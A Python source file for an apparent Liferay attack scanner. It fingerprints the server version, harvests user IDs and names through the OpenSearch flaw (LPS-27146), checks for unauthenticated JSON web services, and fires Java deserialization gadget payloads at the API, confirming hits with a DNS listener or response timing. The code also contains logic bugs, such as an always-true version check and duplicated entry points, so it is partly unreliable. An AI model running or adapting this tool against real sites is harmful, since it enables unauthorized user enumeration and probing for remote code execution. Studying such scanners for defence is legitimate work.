import requests
import requests.exceptions as exception
import re
import socket
import time
import urllib3
import logging
from bs4 import BeautifulSoup as Soup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})


# Compare of Machine Ip with Target Ip
# def compare_ip(target_ip):
#     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
#     s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
#     s.settimeout(1)
#     try:
#         add = s.recvfrom(65565)
#         my_ip = add[-1][0]
#         if my_ip == target_ip:
#             return True
#         else:
#             return False
#     except socket.timeout:
#         return False

# Catch DNS query while sending DNS java deserialization payloads
def catch_dns_query():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    port = 53
    hostname = socket.gethostname()
    my_ip = socket.gethostbyname(hostname)
    sock.bind((my_ip, port))
    sock.settimeout(2)
    try:
        while True:
            data = sock.recvfrom(512)
            # target_ip = data[1][0]
            if "google" in str(data):
                return True
            else:
                return False
    except socket.timeout:
        return False


# Java Deserialization Ping Scan
def ping_deserialization(url):
    print("[DNS Scan]")
    url_reformat = re.sub('.*://', '', url)
    url_reformat = re.sub('([:/]).*', '', url_reformat)
    target_ip = socket.gethostbyname(url_reformat)
    print("Ping scan")
    list_ping = ["CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
                 "CommonsCollections4", "Jdk7u21", "ROME", "Spring1", "Spring2", "BeanShell1",
                 "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
                 "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]

    # list_ping = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
    #              "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
    for name in list_ping:
        print(name)
        payload = open('core/payload_ping/{}.bin'.format(name), 'rb')
        time.sleep(1)
        rq = session.post(url, data=payload, verify=False)
        if catch_dns_query():
            print('    [+] {} lib can be POTENTIAL vulnerable'.format(name.strip()))
    # else:
    #     print('    [-] {} lib is NOT vulnerable'.format(name.strip()))


# Java Deserialization Sleep Scan
def sleep_deserialization(url):
    print("[Sleep scan]")
    list_sleep = ["CommonsBeanUtils", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
                  "CommonsCollections4", "Jdk7u21", "Json1", "ROME", "Spring1", "Spring2"]
    for name in list_sleep:
        payload = open('core/payload_sleep/{}.bin'.format(name), 'rb')
        rq = session.post(url, data=payload, verify=False)
        print(name + '-' + str(rq.elapsed.total_seconds()))
        if rq.elapsed.total_seconds() >= 10:
            print("    [+] {} lib can be POTENTIAL vulnerable".format(name))
        # else:
        #     print('    [-] {} lib is NOT vulnerable'.format(name.strip()))
        session.close()
        time.sleep(0.5)


# [LPS-27146] Guests can view names of all Liferay users
def opensearch(url):
    print('\033[93m' + "[+] OpenSearch Gathering" + '\033[91m')
    print("")
    alphabet = ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x',
                'y']
    user_info = dict()
    for char in alphabet:
        rq = session.get(url + "/c/search/open_search?p=1&c=5000&keywords=emailAddress:{}*".format(char),
                         verify=False)
        soup = Soup(rq.text, 'xml')
        entry = soup.find_all("entry")
        for attr in entry:
            link_tag = re.match('.*u_i_d=(.*)"', str(attr.find('link')))
            uid = link_tag.group(1)
            title_tag = str(attr.find('title'))
            title = re.sub("<title>", "", title_tag)
            title = re.sub("</title>", "", title)
            user_info[uid] = title
    if user_info is not None:
        for uid in user_info:
            print("UserID: " + uid + " - " + str(user_info[uid]))
    else:
        print("~> None")
    print("")


# [LPS-26935] All JSON web services are accessible without authentication
def json_api(url):
    rq = session.get(url + "/api/jsonws/user/get-user-by-id", verify=False)
    if rq.status_code == 200:
        print("[!] May have [LPS-26935] All JSON web services are accessible without authentication ")
    else:
        print("~> None")


def info_gathering(url):
    global version
    rq = session.get(url, timeout=10, verify=False)
    server = rq.headers['Server']
    version = rq.headers.get('Liferay-Portal')
    if version is None:
        rq = session.get(url + '/api/jsonws', timeout=10, verify=False)
        version = rq.headers.get('Liferay-Portal')
    if version is None:
        print("'\033[91m' + [!] This website is not using Liferay or cannot detect! ")
        return False
    else:
        print("\n==== Information ====")
        print('\033[91m' + "Sever: " + server)
        print('\033[91m' + "Version: " + version)
        print("")
        return True


# Main function
def main(url):
    try:
        # Gathering information of target
        if info_gathering(url) is True:
            # Vulnerabilities of target
            print('\033[93m' + "==== Vulnerabilities ====")
            if "6.1.0" or "6.0.12" or "6.1.10" or "6.2.0" in version:
                json_api(url)
            if "6.1.0" in version:
                opensearch(url)
            entry_point1 = url + "////api/liferay"
            entry_point2 = url + "////api/liferay"
            if session.post(entry_point1, timeout=10, verify=False).status_code == 200:
                print(
                    '\033[91m' + "[!] Liferay API allow POST request - May have [LPS-64441] Java Serialization "
                                 "Vulnerability")
                # sleep_deserialization(entry_point1)
                ping_deserialization(entry_point1)
            elif session.post(entry_point2, timeout=10, verify=False).status_code == 200:
                print(
                    '\033[91m' + "[!] Spring API allow POST request - May have [LPS-64441] Java Serialization "
                                 "Vulnerability")
                # sleep_deserialization(entry_point2)
                ping_deserialization(entry_point2)
            else:
                print("~> Website is not using LifeRay or not detected!")

    except exception.ConnectionError:
        print("[!] Name or service not known!")
        logging.error("[!] Name or service not known!")
    except exception.InvalidURL and exception.MissingSchema:
        print("[!] Invalid Url - Url must start with http(s)!")
        logging.error("[!] Invalid Url - Url must start with http(s)!")
    except Exception as ex:
        print("[!] Something get error see the log file!")
        logging.error(ex)
